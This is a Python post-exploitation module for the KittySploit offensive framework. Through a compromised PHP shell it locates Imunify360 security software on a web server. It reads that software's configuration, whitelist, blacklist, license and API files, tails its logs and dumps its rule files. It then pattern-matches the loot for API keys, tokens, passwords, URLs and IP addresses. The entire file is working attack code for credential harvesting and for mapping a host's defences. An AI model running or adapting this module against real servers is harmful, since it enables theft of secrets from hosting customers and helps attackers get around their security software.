from kittysploit import *
from core.framework.failure import ProcedureError, FailureType

class Module(Post):

	__info__ = {
		"name": "Enumerate MyImunify360 Configuration",
		"description": "Extract MyImunify360 configuration, credentials, whitelist, and rules",
		"author": "KittySploit Team",
		"arch": Arch.PHP,
	}	
	
	def run(self):
		try:
			# Common MyImunify paths
			imunify_paths = [
				"/etc/imunify360",
				"/etc/imunify",
				"/usr/local/imunify360",
				"../etc/imunify360",
				"../../etc/imunify360",
			]
			
			# Files to check
			config_files = [
				"imunify360.conf",
				"agent.json",
				"features.json",
				"whitelist.conf",
				"blacklist.conf",
				"rules.conf",
				"api.conf",
				"license.conf",
			]
			
			# Log files
			log_files = [
				"/var/log/imunify360/agent.log",
				"/var/log/imunify360/imunify360.log",
				"/var/log/imunify360/error.log",
				"/var/log/imunify360/access.log",
			]
			
			found_files = {}
			imunify_base_path = None
			
			# Find MyImunify installation directory
			for base_path in imunify_paths:
				check_code = f"""
$base = '{base_path.replace("'", "\\'")}';
if (is_dir($base)) {{
	echo 'EXISTS';
}} else {{
	echo 'NOT_FOUND';
}}
"""
				result = self.cmd_execute(check_code)
				if result and 'EXISTS' in result:
					imunify_base_path = base_path
					print_success(f"Found MyImunify directory: {base_path}")
					break
			
			if not imunify_base_path:
				# Try to find .myimunify_id file to get base path
				find_id_code = """
$paths = array(
	'/etc/imunify360',
	'/etc/imunify',
	'/usr/local/imunify360',
	'../etc/imunify360',
	'../../etc/imunify360',
	'.',
	'..',
	'../..',
);
foreach ($paths as $path) {
	$file = $path . '/.myimunify_id';
	if (file_exists($file)) {
		echo dirname($file);
		break;
	}
}
"""
				result = self.cmd_execute(find_id_code)
				if result and result.strip():
					imunify_base_path = result.strip()
					print_info(f"Found MyImunify via .myimunify_id: {imunify_base_path}")
			
			if not imunify_base_path:
				print_warning("MyImunify directory not found in common locations")
				print_info("Attempting to read .myimunify_id from current directory...")
			
			# Read .myimunify_id
			read_id_code = """
$paths = array('.myimunify_id', '../.myimunify_id', '../../.myimunify_id', '/etc/imunify360/.myimunify_id');
foreach ($paths as $path) {
	if (file_exists($path)) {
		echo file_get_contents($path);
		break;
	}
}
"""
			id_result = self.cmd_execute(read_id_code)
			if id_result and id_result.strip():
				print_success("MyImunify ID found:")
				print_info(id_result.strip())
				found_files['.myimunify_id'] = id_result.strip()
			
			# Read configuration files
			if imunify_base_path:
				print_info(f"\nReading configuration files from: {imunify_base_path}")
				
				for config_file in config_files:
					file_path = f"{imunify_base_path}/{config_file}"
					read_code = f"""
$file = '{file_path.replace("'", "\\'")}';
if (file_exists($file) && is_readable($file)) {{
	echo file_get_contents($file);
}} else {{
	echo 'FILE_NOT_FOUND';
}}
"""
					result = self.cmd_execute(read_code)
					if result and 'FILE_NOT_FOUND' not in result:
						found_files[config_file] = result
						print_success(f"Found: {config_file}")
					
			# Also try reading from common absolute paths
			for config_file in config_files:
				abs_paths = [
					f"/etc/imunify360/{config_file}",
					f"/etc/imunify/{config_file}",
					f"/usr/local/imunify360/{config_file}",
				]
				
				for abs_path in abs_paths:
					read_code = f"""
$file = '{abs_path.replace("'", "\\'")}';
if (file_exists($file) && is_readable($file)) {{
	echo file_get_contents($file);
}} else {{
	echo 'FILE_NOT_FOUND';
}}
"""
					result = self.cmd_execute(read_code)
					if result and 'FILE_NOT_FOUND' not in result and config_file not in found_files:
						found_files[config_file] = result
						print_success(f"Found: {abs_path}")
						break
			
			# Read log files (last 50 lines to avoid huge output)
			print_info("\nReading log files (last 50 lines):")
			for log_file in log_files:
				read_log_code = f"""
$file = '{log_file.replace("'", "\\'")}';
if (file_exists($file) && is_readable($file)) {{
	$lines = file($file);
	if ($lines) {{
		$last_lines = array_slice($lines, -50);
		echo implode('', $last_lines);
	}} else {{
		echo 'EMPTY';
	}}
}} else {{
	echo 'FILE_NOT_FOUND';
}}
"""
				result = self.cmd_execute(read_log_code)
				if result and 'FILE_NOT_FOUND' not in result and 'EMPTY' not in result:
					found_files[f"log_{log_file.split('/')[-1]}"] = result
					print_success(f"Found log: {log_file}")
			
			# List rules directory
			if imunify_base_path:
				list_rules_code = f"""
$rules_dir = '{imunify_base_path.replace("'", "\\'")}/rules';
if (is_dir($rules_dir)) {{
	$files = scandir($rules_dir);
	foreach ($files as $file) {{
		if ($file != '.' && $file != '..' && is_file($rules_dir . '/' . $file)) {{
			echo $file . PHP_EOL;
		}}
	}}
}} else {{
	echo 'DIR_NOT_FOUND';
}}
"""
				rules_result = self.cmd_execute(list_rules_code)
				if rules_result and 'DIR_NOT_FOUND' not in rules_result:
					print_info(f"\nRules files found:")
					print_info(rules_result)
					
					# Read each rule file
					for rule_file in rules_result.strip().split('\n'):
						if rule_file.strip():
							rule_path = f"{imunify_base_path}/rules/{rule_file.strip()}"
							read_rule_code = f"""
$file = '{rule_path.replace("'", "\\'")}';
if (file_exists($file) && is_readable($file)) {{
	echo file_get_contents($file);
}} else {{
	echo 'FILE_NOT_FOUND';
}}
"""
							rule_content = self.cmd_execute(read_rule_code)
							if rule_content and 'FILE_NOT_FOUND' not in rule_content:
								found_files[f"rule_{rule_file.strip()}"] = rule_content
			
			# Display found information
			if found_files:
				print_success("\n=== MyImunify360 Information ===")
				
				for filename, content in found_files.items():
					print_info(f"\n--- {filename} ---")
					# Truncate very long content
					if len(content) > 2000:
						print_info(content[:2000] + "\n... (truncated)")
					else:
						print_info(content)
				
				# Extract sensitive information
				print_info("\n=== Extracted Information ===")
				
				# Look for API keys, tokens, passwords
				all_content = '\n'.join(found_files.values())
				
				# Search for common patterns
				import re
				
				# API keys
				api_keys = re.findall(r'(api[_-]?key|apikey|api_key)\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})["\']?', all_content, re.IGNORECASE)
				if api_keys:
					print_success("Potential API keys found:")
					for key, value in api_keys:
						print_info(f"  {key}: {value[:20]}...")
				
				# Tokens
				tokens = re.findall(r'(token|access_token|auth_token)\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})["\']?', all_content, re.IGNORECASE)
				if tokens:
					print_success("Potential tokens found:")
					for token_type, value in tokens:
						print_info(f"  {token_type}: {value[:20]}...")
				
				# Passwords
				passwords = re.findall(r'(password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\s]{8,})["\']?', all_content, re.IGNORECASE)
				if passwords:
					print_success("Potential passwords found:")
					for pwd_type, value in passwords:
						print_info(f"  {pwd_type}: {value[:20]}...")
				
				# URLs/Endpoints
				urls = re.findall(r'(https?://[^\s"\'<>]+)', all_content)
				if urls:
					print_success("URLs/Endpoints found:")
					for url in set(urls[:10]):  # Limit to 10 unique URLs
						print_info(f"  {url}")
				
				# IP addresses
				ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', all_content)
				if ips:
					print_success("IP addresses found:")
					for ip in set(ips[:10]):  # Limit to 10 unique IPs
						print_info(f"  {ip}")
				
				return True
			else:
				print_warning("No MyImunify configuration files found")
				return False
				
		except ProcedureError:
			raise
		except Exception as e:
			raise ProcedureError(FailureType.Unknown, f"Error enumerating MyImunify: {e}")

